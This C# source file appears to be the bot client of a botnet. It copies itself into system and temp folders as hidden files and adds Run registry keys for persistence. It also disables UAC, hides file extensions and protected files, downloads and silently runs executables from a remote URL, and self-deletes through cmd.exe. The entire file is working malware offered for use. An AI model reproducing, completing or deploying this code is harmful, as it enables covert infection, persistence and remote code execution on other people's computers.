using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using BotNet.Services.Common;
using Microsoft.Win32;

namespace BotNet.Services.Manager
{
    public class Bot
    {
        private Factory _factoryService = new Factory();
        private Mutex yMutex;
        private void InstallBot()
        {
            string selfPath = Process.GetCurrentProcess().MainModule.FileName;
            Process pProcess;

            if (Config.AdminStatus)
            {
                Config.FilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + Config.FileName[0];
                Config.FilePath[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + @"\" + Config.FileName[1];
            }
            else
            {
                Config.FilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\" + Config.FileName[0];
                Config.FilePath[1] = Environment.GetEnvironmentVariable("TEMP") + @"\" + Config.FileName[1];
            }

            if (!CheckInstall())
            {
                try
                {
                    foreach (string path in Config.FilePath)
                    {
                        if (!_factoryService.CheckFile(path))
                        {
                            File.Copy(selfPath, path);
                        }
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                }
                catch { }

                if (Config.AdminStatus)
                {
                    try
                    {
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Miiicrosoft\Windows\CurrentVersion\Run", true).SetValue(Config.RegName[0], ('"' + Config.FilePath[0] + '"'));
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).SetValue(Config.RegName[1], ('"' + Config.FilePath[1] + '"'));
                    }
                    catch { }
                }
                else
                {
                    try
                    {
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue(Config.RegName[0], ('"' + Config.FilePath[0] + '"'));
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).SetValue(Config.RegName[1], ('"' + Config.FilePath[1] + '"'));
                    }
                    catch { }
                }

                try
                {
                    yMutex.Close();

                    foreach (string sFile in Config.FilePath)
                    {
                        pProcess = new Process();
                        pProcess.StartInfo.FileName = sFile;
                        pProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                       
                        pProcess.Start();
                    }
                }
                catch { }

                Environment.Exit(0);
            }
        }
        private void DisableProcedures()
        {
            try
            {
                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("Hidden", "2", RegistryValueKind.DWord);
            }
            catch { }

            try
            {
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",true).SetValue("HideFileExt","1",RegistryValueKind.DWord);
            }
            catch { }

            if (Config.DisableUAC)
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    if (Config.AdminStatus)
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\lnkfile", true).DeleteValue("IsShortcut");
                }
                catch { }
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("ShowSuperHidden", "0", RegistryValueKind.DWord);
                }
                catch { }
            }
           
        }

        public void UpdateBot(string url)
        {
            try
            {
                WebClient client = new WebClient();
                string tempName = _factoryService.GenString(new Random().Next(5, 12)) + ".exe";
                if (!url.StartsWith("http://"))
                {
                    url = "http://" + url;
                }

                client.DownloadFile(url, Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                yMutex.Close();
                Process process = new Process();
                process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();

                Environment.Exit(0);
            } catch { }
        }

        public void RemoveBot()
        {
            try
            {
                ProcessStartInfo Flash = new ProcessStartInfo();

                Flash.Arguments = "/C choice /C Y /N /D Y /T 3 &Del \"" +
                                  (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name +
                                  "\"";
                Flash.WindowStyle = ProcessWindowStyle.Hidden;
                Flash.CreateNoWindow = true;
                Flash.FileName = "cmd.exe";
                Process.Start(Flash).Dispose();
                Process.GetCurrentProcess().Kill();
            }
            catch {  }
        }

        private bool CheckInstall()
        {
            if (_factoryService.CheckFile(Config.FilePath[0]) || _factoryService.CheckFile(Config.FilePath[1]))
                return true;
            return false;
        }

        public void LoadSystem()
        {
            yMutex = new Mutex(true, Config.HWID, out var isCreated);
            if (!isCreated)
                Environment.Exit(0);
            InstallBot();
            DisableProcedures();
        }
    }
}
